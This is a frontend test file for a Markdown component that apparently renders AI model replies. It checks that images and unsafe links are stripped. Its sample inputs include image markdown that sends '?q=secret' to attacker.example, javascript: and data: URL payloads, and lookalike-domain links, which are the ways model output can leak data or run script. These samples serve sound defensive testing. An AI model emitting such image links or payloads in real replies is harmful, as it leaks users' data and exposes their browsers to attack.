import { render, screen } from "@testing-library/react";

import { Markdown } from "./Markdown";

describe("Markdown", () => {
  it("never renders images from model text", () => {
    const { container } = render(
      <Markdown>
        {
          'Here you go ![leak](https://attacker.example/?q=secret) and ![ref][r]\n\n[r]: https://attacker.example/r.png\n\n<img src="https://attacker.example/x.png">'
        }
      </Markdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("attacker.example");
    expect(container).toHaveTextContent("Here you go");
  });

  it("renders links that open safely in a new tab", () => {
    render(<Markdown>{"See [the recipe](https://www.thecocktaildb.com/drink/1)."}</Markdown>);
    const link = screen.getByRole("link", { name: "the recipe" });
    expect(link).toHaveAttribute("href", "https://www.thecocktaildb.com/drink/1");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noreferrer noopener");
  });

  it("renders only https links to the catalogs' sites; anything else is plain text", () => {
    const { container } = render(
      <Markdown>
        {[
          "[a](javascript:alert(1))",
          "[b](data:text/html;base64,PHNjcmlwdD4=)",
          "[c](http://attacker.example/?q=secret)",
          "[d](/chat/feedback)",
          "[e](//attacker.example/x)",
          "[f](JAVASCRIPT:alert(1))",
          "[g](https://other.example/?q=secret)",
          "[h](https://www.goodreads.com@attacker.example/x)",
          "[i](https://www.goodreads.com.attacker.example/x)",
          "[j](https://openlibrary.org:8443/x)",
          "<https://openlibrary.org/works/OL45804W>",
        ].join(" ")}
      </Markdown>,
    );
    const links = screen.getAllByRole("link");
    expect(links.map((link) => link.getAttribute("href"))).toEqual([
      "https://openlibrary.org/works/OL45804W",
    ]);
    expect(container.innerHTML).not.toMatch(
      /javascript:|data:text|attacker\.example|other\.example/i,
    );
    expect(container).toHaveTextContent("a b c d e f g h i j");
  });
});
